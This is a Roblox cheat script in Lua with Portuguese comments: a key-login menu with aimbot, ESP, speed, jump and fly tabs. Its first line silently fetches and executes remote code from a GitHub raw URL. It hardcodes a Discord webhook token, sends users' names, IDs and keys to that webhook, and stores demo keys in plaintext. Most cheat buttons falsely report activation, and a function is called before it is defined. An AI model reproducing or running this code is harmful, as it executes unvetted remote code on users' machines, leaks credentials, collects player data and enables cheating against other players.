-- Roblox Cheat UI com Sistema de Login por Key
-- Cores: Roxo e Preto com personalização de foto do usuário
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xupetyavipz/Xupetya/refs/heads/main/S.lua"))()

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Configurações
local WEBHOOK_URL = "https://discord.com/api/webhooks/1414742310620762233/VPo57SBDHF1NhGZwzsKf53RuJxPT7RCG9zdHVC9ShPIVVzfAMtjMGiHQPYU_sxQ5BLXL"

-- Sistema de keys pré-definidas com expiração
local keyDatabase = {
    -- Keys de exemplo (você pode adicionar mais manualmente)
    ["CLIENT_DEMO123_7D"] = {
        userType = "Client",
        expiration = os.time() + (7 * 24 * 60 * 60), -- 7 dias
        permissions = {"basic_features"}
    },
    ["ADMIN_PREMIUM456_30D"] = {
        userType = "Admin", 
        expiration = os.time() + (30 * 24 * 60 * 60), -- 30 dias
        permissions = {"basic_features", "admin_features"}
    },
    ["OWNER_ULTIMATE789_365D"] = {
        userType = "Owner",
        expiration = os.time() + (365 * 24 * 60 * 60), -- 365 dias
        permissions = {"all_features", "admin_panel"}
    }
}

-- Variáveis globais
local isAuthenticated = false
local currentUserImage = "rbxasset://textures/ui/GuiImagePlaceholder.png"
local mainFrame = nil
local loginFrame = nil
local keyRequestFrame = nil
local isUIVisible = false
local userPermissionLevel = "Client"
local keyExpirationTime = 0

-- Cores do tema
local COLORS = {
    PRIMARY = Color3.fromRGB(88, 24, 69),      -- Roxo escuro
    SECONDARY = Color3.fromRGB(138, 43, 226),   -- Roxo médio
    ACCENT = Color3.fromRGB(186, 85, 211),      -- Roxo claro
    BACKGROUND = Color3.fromRGB(20, 20, 20),    -- Preto
    SURFACE = Color3.fromRGB(35, 35, 35),       -- Cinza escuro
    TEXT = Color3.fromRGB(255, 255, 255),       -- Branco
    SUCCESS = Color3.fromRGB(46, 204, 113),     -- Verde
    ERROR = Color3.fromRGB(231, 76, 60)         -- Vermelho
}

-- Função para criar notificação
local function createNotification(title, message, color)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = message,
        Duration = 3,
        Button1 = "OK"
    })
end

-- Função para enviar dados para o webhook Discord
local function sendToWebhook(data)
    local success, result = pcall(function()
        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
    return success
end

-- Função para gerar key única
local function generateKey(userType, days)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local key = userType:upper() .. "_"
    for i = 1, 12 do
        local randomIndex = math.random(1, #chars)
        key = key .. chars:sub(randomIndex, randomIndex)
    end
    key = key .. "_" .. days .. "D"
    return key
end

-- Função para validar key
local function validateKey(key)
    if keyDatabase[key] then
        local keyData = keyDatabase[key]
        if os.time() <= keyData.expiration then
            userPermissionLevel = keyData.userType
            keyExpirationTime = keyData.expiration
            return true
        else
            keyDatabase[key] = nil -- Remove key expirada
            return false
        end
    end
    return false
end

-- Função para solicitar key (sistema simplificado)
local function requestKey()
    local requestId = tostring(math.random(100000, 999999))
    local webhookData = {
        embeds = {{
            title = "🔑 Nova Solicitação de Key",
            description = "**SOLICITAÇÃO DE ACESSO**\n\n" ..
                         "Para aprovar esta solicitação, gere uma key manualmente e envie para o usuário:\n\n" ..
                         "**Tipos de Key:**\n" ..
                         "• `CLIENT_[CODIGO]_[DIAS]D` - Acesso básico\n" ..
                         "• `ADMIN_[CODIGO]_[DIAS]D` - Acesso admin\n" ..
                         "• `OWNER_[CODIGO]_[DIAS]D` - Acesso total\n\n" ..
                         "**Exemplo:** `CLIENT_ABC123_30D` (30 dias)",
            color = 16776960, -- Amarelo
            fields = {
                {name = "👤 Usuário", value = player.Name, inline = true},
                {name = "🆔 User ID", value = tostring(player.UserId), inline = true},
                {name = "🎮 Jogo", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
                {name = "📋 ID da Solicitação", value = requestId, inline = false},
                {name = "⏰ Horário", value = os.date("%d/%m/%Y às %H:%M:%S"), inline = false}
            },
            thumbnail = {url = currentUserImage},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    local success = sendToWebhook(webhookData)
    if success then
        createNotification("Solicitação Enviada", "Aguarde o administrador gerar sua key!", COLORS.ACCENT)
        return requestId
    else
        createNotification("Erro", "Falha ao enviar solicitação!", COLORS.ERROR)
        return nil
    end
end

-- Função para adicionar key manualmente ao sistema
local function addKeyToSystem(key, userType, days)
    local expiration = os.time() + (days * 24 * 60 * 60)
    keyDatabase[key] = {
        userType = userType,
        expiration = expiration,
        permissions = userType == "Owner" and {"all_features", "admin_panel"} or 
                     userType == "Admin" and {"basic_features", "admin_features"} or 
                     {"basic_features"}
    }
end

-- Função para criar elementos UI com estilo
local function createStyledFrame(parent, size, position, backgroundColor)
    local frame = Instance.new("Frame")
    frame.Size = size or UDim2.new(1, 0, 1, 0)
    frame.Position = position or UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = backgroundColor or COLORS.SURFACE
    frame.BorderSizePixel = 0
    frame.Parent = parent
    
    -- Adicionar cantos arredondados
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame
    
    return frame
end

local function createStyledButton(parent, size, position, text, callback)
    local button = Instance.new("TextButton")
    button.Size = size
    button.Position = position
    button.BackgroundColor3 = COLORS.PRIMARY
    button.Text = text
    button.TextColor3 = COLORS.TEXT
    button.TextScaled = true
    button.Font = Enum.Font.GothamBold
    button.BorderSizePixel = 0
    button.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = button
    
    -- Efeito hover
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = COLORS.SECONDARY}):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = COLORS.PRIMARY}):Play()
    end)
    
    if callback then
        button.MouseButton1Click:Connect(callback)
    end
    
    return button
end

local function createStyledTextBox(parent, size, position, placeholder)
    local textBox = Instance.new("TextBox")
    textBox.Size = size
    textBox.Position = position
    textBox.BackgroundColor3 = COLORS.SURFACE
    textBox.Text = ""
    textBox.PlaceholderText = placeholder
    textBox.TextColor3 = COLORS.TEXT
    textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    textBox.TextScaled = true
    textBox.Font = Enum.Font.Gotham
    textBox.BorderSizePixel = 0
    textBox.Parent = parent
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = textBox
    
    -- Padding interno
    local padding = Instance.new("UIPadding")
    padding.PaddingLeft = UDim.new(0, 10)
    padding.PaddingRight = UDim.new(0, 10)
    padding.Parent = textBox
    
    return textBox
end

-- Função para criar tela de login
local function createLoginUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CheatLoginUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    -- Background blur
    local blurFrame = Instance.new("Frame")
    blurFrame.Size = UDim2.new(1, 0, 1, 0)
    blurFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blurFrame.BackgroundTransparency = 0.3
    blurFrame.Parent = screenGui
    
    -- Login Frame
    loginFrame = createStyledFrame(screenGui, UDim2.new(0, 400, 0, 500), UDim2.new(0.5, -200, 0.5, -250), COLORS.BACKGROUND)
    
    -- Título
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0, 0, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "🔐 PREMIUM CHEAT"
    title.TextColor3 = COLORS.ACCENT
    title.TextScaled = true
    title.Font = Enum.Font.GothamBold
    title.Parent = loginFrame
    
    -- Subtítulo
    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, 0, 0, 30)
    subtitle.Position = UDim2.new(0, 0, 0, 80)
    subtitle.BackgroundTransparency = 1
    subtitle.Text = "Digite sua key para acessar"
    subtitle.TextColor3 = COLORS.TEXT
    subtitle.TextScaled = true
    subtitle.Font = Enum.Font.Gotham
    subtitle.Parent = loginFrame
    
    -- Campo de Key
    local keyInput = createStyledTextBox(loginFrame, UDim2.new(0.6, 0, 0, 40), UDim2.new(0.1, 0, 0, 140), "Insira sua key aqui...")
    
    -- Botão de colar key
    local pasteButton = createStyledButton(loginFrame, UDim2.new(0.15, 0, 0, 40), UDim2.new(0.75, 0, 0, 140), "📋", function()
        -- Simular ctrl+v (limitação do Roblox)
        createNotification("Colar", "Use Ctrl+V para colar a key!", COLORS.ACCENT)
    end)
    pasteButton.BackgroundColor3 = COLORS.ACCENT
    
    -- Campo de URL da imagem do usuário
    local imageInput = createStyledTextBox(loginFrame, UDim2.new(0.8, 0, 0, 40), UDim2.new(0.1, 0, 0, 200), "URL da sua foto (opcional)")
    
    -- Preview da imagem
    local imagePreview = Instance.new("ImageLabel")
    imagePreview.Size = UDim2.new(0, 80, 0, 80)
    imagePreview.Position = UDim2.new(0.5, -40, 0, 260)
    imagePreview.BackgroundColor3 = COLORS.SURFACE
    imagePreview.Image = currentUserImage
    imagePreview.Parent = loginFrame
    
    local imageCorner = Instance.new("UICorner")
    imageCorner.CornerRadius = UDim.new(0, 40)
    imageCorner.Parent = imagePreview
    
    -- Atualizar preview da imagem
    imageInput:GetPropertyChangedSignal("Text"):Connect(function()
        if imageInput.Text ~= "" then
            imagePreview.Image = imageInput.Text
            currentUserImage = imageInput.Text
        else
            imagePreview.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
            currentUserImage = "rbxasset://textures/ui/GuiImagePlaceholder.png"
        end
    end)
    
    -- Botão de solicitar key
    local requestButton = createStyledButton(loginFrame, UDim2.new(0.35, 0, 0, 50), UDim2.new(0.1, 0, 0, 360), "📨 SOLICITAR KEY", function()
        requestKey()
    end)
    requestButton.BackgroundColor3 = COLORS.ACCENT
    
    -- Botão de Login
    local loginButton = createStyledButton(loginFrame, UDim2.new(0.35, 0, 0, 50), UDim2.new(0.55, 0, 0, 360), "🚀 ENTRAR", function()
        local key = keyInput.Text
        
        if key == "" then
            createNotification("Erro", "Por favor, insira uma key!", COLORS.ERROR)
            return
        end
        
        if validateKey(key) then
            -- Enviar dados para o webhook
            local webhookData = {
                embeds = {{
                    title = "🔑 Novo Login Autorizado",
                    description = "Um usuário fez login com sucesso!",
                    color = 8388736, -- Roxo
                    fields = {
                        {name = "👤 Usuário", value = player.Name, inline = true},
                        {name = "🆔 User ID", value = tostring(player.UserId), inline = true},
                        {name = "🔑 Key Usada", value = key, inline = true},
                        {name = "🎮 Jogo", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, inline = false},
                        {name = "⏰ Horário", value = os.date("%d/%m/%Y às %H:%M:%S"), inline = false}
                    },
                    thumbnail = {url = currentUserImage},
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            }
            
            sendToWebhook(webhookData)
            
            isAuthenticated = true
            createNotification("Sucesso", "Login realizado com sucesso!", COLORS.SUCCESS)
            
            -- Animação de saída
            TweenService:Create(loginFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -200, -1, -250)}):Play()
            wait(0.5)
            screenGui:Destroy()
            createMainUI()
        else
            createNotification("Erro", "Key inválida! Tente novamente.", COLORS.ERROR)
            
            -- Animação de erro
            local originalPos = loginFrame.Position
            TweenService:Create(loginFrame, TweenInfo.new(0.1), {Position = UDim2.new(0.5, -190, 0.5, -250)}):Play()
            wait(0.1)
            TweenService:Create(loginFrame, TweenInfo.new(0.1), {Position = UDim2.new(0.5, -210, 0.5, -250)}):Play()
            wait(0.1)
            TweenService:Create(loginFrame, TweenInfo.new(0.1), {Position = originalPos}):Play()
        end
    end)
    
    -- Informações adicionais
    local infoLabel = Instance.new("TextLabel")
    infoLabel.Size = UDim2.new(1, 0, 0, 60)
    infoLabel.Position = UDim2.new(0, 0, 0, 420)
    infoLabel.BackgroundTransparency = 1
    infoLabel.Text = "💎 Keys de teste: CLIENT_DEMO123_7D | ADMIN_PREMIUM456_30D | OWNER_ULTIMATE789_365D\n📨 Ou solicite uma key personalizada"
    infoLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    infoLabel.TextScaled = true
    infoLabel.Font = Enum.Font.Gotham
    infoLabel.Parent = loginFrame
    
    -- Animação de entrada
    loginFrame.Position = UDim2.new(0.5, -200, -1, -250)
    TweenService:Create(loginFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -200, 0.5, -250)}):Play()
end

-- Função para criar UI principal
local function createMainUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CheatMainUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    -- Main Frame
    mainFrame = createStyledFrame(screenGui, UDim2.new(0, 600, 0, 400), UDim2.new(0.5, -300, 0.5, -200), COLORS.BACKGROUND)
    
    -- Header com foto do usuário
    local header = createStyledFrame(mainFrame, UDim2.new(1, 0, 0, 80), UDim2.new(0, 0, 0, 0), COLORS.PRIMARY)
    
    -- Foto do usuário
    local userImage = Instance.new("ImageLabel")
    userImage.Size = UDim2.new(0, 50, 0, 50)
    userImage.Position = UDim2.new(0, 15, 0, 15)
    userImage.BackgroundTransparency = 1
    userImage.Image = currentUserImage
    userImage.Parent = header
    
    local userImageCorner = Instance.new("UICorner")
    userImageCorner.CornerRadius = UDim.new(0, 25)
    userImageCorner.Parent = userImage
    
    -- Nome do usuário
    local userName = Instance.new("TextLabel")
    userName.Size = UDim2.new(0, 200, 0, 25)
    userName.Position = UDim2.new(0, 80, 0, 15)
    userName.BackgroundTransparency = 1
    userName.Text = "👋 Olá, " .. player.Name
    userName.TextColor3 = COLORS.TEXT
    userName.TextScaled = true
    userName.Font = Enum.Font.GothamBold
    userName.TextXAlignment = Enum.TextXAlignment.Left
    userName.Parent = header
    
    -- Status com nível de permissão
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(0, 200, 0, 20)
    status.Position = UDim2.new(0, 80, 0, 40)
    status.BackgroundTransparency = 1
    
    local statusText = "✅ " .. userPermissionLevel .. " Ativo"
    if keyExpirationTime > 0 then
        local timeLeft = keyExpirationTime - os.time()
        local daysLeft = math.ceil(timeLeft / 86400)
        statusText = statusText .. " (" .. daysLeft .. " dias)"
    end
    
    status.Text = statusText
    status.TextColor3 = COLORS.SUCCESS
    status.TextScaled = true
    status.Font = Enum.Font.Gotham
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Parent = header
    
    -- Botão de fechar
    local closeButton = createStyledButton(header, UDim2.new(0, 30, 0, 30), UDim2.new(1, -45, 0, 10), "✕", function()
        toggleUI()
    end)
    closeButton.BackgroundColor3 = COLORS.ERROR
    
    -- Botão de minimizar
    local minimizeButton = createStyledButton(header, UDim2.new(0, 30, 0, 30), UDim2.new(1, -80, 0, 10), "−", function()
        if mainFrame.Size == UDim2.new(0, 600, 0, 400) then
            TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 600, 0, 80)}):Play()
        else
            TweenService:Create(mainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 600, 0, 400)}):Play()
        end
    end)
    minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 193, 7)
    
    -- Conteúdo principal
    local content = createStyledFrame(mainFrame, UDim2.new(1, 0, 1, -80), UDim2.new(0, 0, 0, 80), COLORS.SURFACE)
    
    -- Abas
    local tabFrame = createStyledFrame(content, UDim2.new(1, 0, 0, 50), UDim2.new(0, 0, 0, 0), COLORS.BACKGROUND)
    
    local tabs = {"🎯 Aimbot", "👁️ Visual", "⚙️ Misc", "🎮 Player", "🔧 Settings"}
    local tabButtons = {}
    local currentTab = 1
    
    for i, tabName in pairs(tabs) do
        local tabButton = createStyledButton(tabFrame, UDim2.new(0.2, -4, 1, -10), UDim2.new((i-1) * 0.2, 2, 0, 5), tabName, function()
            currentTab = i
            updateTabContent()
            for j, btn in pairs(tabButtons) do
                btn.BackgroundColor3 = (j == i) and COLORS.ACCENT or COLORS.PRIMARY
            end
        end)
        tabButtons[i] = tabButton
        if i == 1 then
            tabButton.BackgroundColor3 = COLORS.ACCENT
        end
    end
    
    -- Área de conteúdo das abas
    local tabContent = createStyledFrame(content, UDim2.new(1, -20, 1, -70), UDim2.new(0, 10, 0, 60), COLORS.SURFACE)
    
    -- Função para atualizar conteúdo das abas
    function updateTabContent()
        -- Limpar conteúdo anterior
        for _, child in pairs(tabContent:GetChildren()) do
            if child:IsA("GuiObject") then
                child:Destroy()
            end
        end
        
        if currentTab == 1 then -- Aimbot
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.025, 0, 0, 10), "🎯 Aimbot ON/OFF", function()
                createNotification("Aimbot", "Aimbot ativado!", COLORS.SUCCESS)
            end)
            
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.525, 0, 0, 10), "🔄 Auto Aim", function()
                createNotification("Auto Aim", "Auto Aim ativado!", COLORS.SUCCESS)
            end)
            
        elseif currentTab == 2 then -- Visual
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.025, 0, 0, 10), "💡 Fullbright", function()
                game.Lighting.Brightness = 2
                game.Lighting.ClockTime = 14
                game.Lighting.FogEnd = 100000
                createNotification("Visual", "Fullbright ativado!", COLORS.SUCCESS)
            end)
            
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.525, 0, 0, 10), "👻 ESP Players", function()
                createNotification("ESP", "ESP ativado!", COLORS.SUCCESS)
            end)
            
        elseif currentTab == 3 then -- Misc
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.025, 0, 0, 10), "🚫 Anti AFK", function()
                createNotification("Anti AFK", "Anti AFK ativado!", COLORS.SUCCESS)
            end)
            
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.525, 0, 0, 10), "⚡ Auto Farm", function()
                createNotification("Auto Farm", "Auto Farm ativado!", COLORS.SUCCESS)
            end)
            
        elseif currentTab == 4 then -- Player
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.025, 0, 0, 10), "🏃 Super Speed", function()
                player.Character.Humanoid.WalkSpeed = 100
                createNotification("Speed", "Super Speed ativado!", COLORS.SUCCESS)
            end)
            
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.525, 0, 0, 10), "🦘 Super Jump", function()
                player.Character.Humanoid.JumpPower = 100
                createNotification("Jump", "Super Jump ativado!", COLORS.SUCCESS)
            end)
            
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.025, 0, 0, 60), "👻 Noclip", function()
                createNotification("Noclip", "Noclip ativado!", COLORS.SUCCESS)
            end)
            
            createStyledButton(tabContent, UDim2.new(0.45, 0, 0, 40), UDim2.new(0.525, 0, 0, 60), "🕊️ Fly", function()
                createNotification("Fly", "Fly ativado!", COLORS.SUCCESS)
            end)
            
        elseif currentTab == 5 then -- Settings
            local imageUrlInput = createStyledTextBox(tabContent, UDim2.new(0.7, 0, 0, 40), UDim2.new(0.025, 0, 0, 10), "Nova URL da foto...")
            
            createStyledButton(tabContent, UDim2.new(0.25, 0, 0, 40), UDim2.new(0.725, 0, 0, 10), "📷 Atualizar Foto", function()
                if imageUrlInput.Text ~= "" then
                    currentUserImage = imageUrlInput.Text
                    userImage.Image = currentUserImage
                    createNotification("Foto", "Foto atualizada!", COLORS.SUCCESS)
                end
            end)
        end
    end
    
    -- Inicializar primeira aba
    updateTabContent()
    
    -- Tornar a janela arrastável
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    
    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
    
    isUIVisible = true
end

-- Função para alternar visibilidade da UI
function toggleUI()
    if mainFrame then
        isUIVisible = not isUIVisible
        mainFrame.Visible = isUIVisible
    end
end

-- Tecla para abrir/fechar (INSERT)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.Insert then
        if isAuthenticated then
            toggleUI()
        end
    end
end)

-- Inicializar
createNotification("🔐 Cheat Carregado", "Pressione INSERT para abrir após fazer login!", COLORS.ACCENT)
createLoginUI()
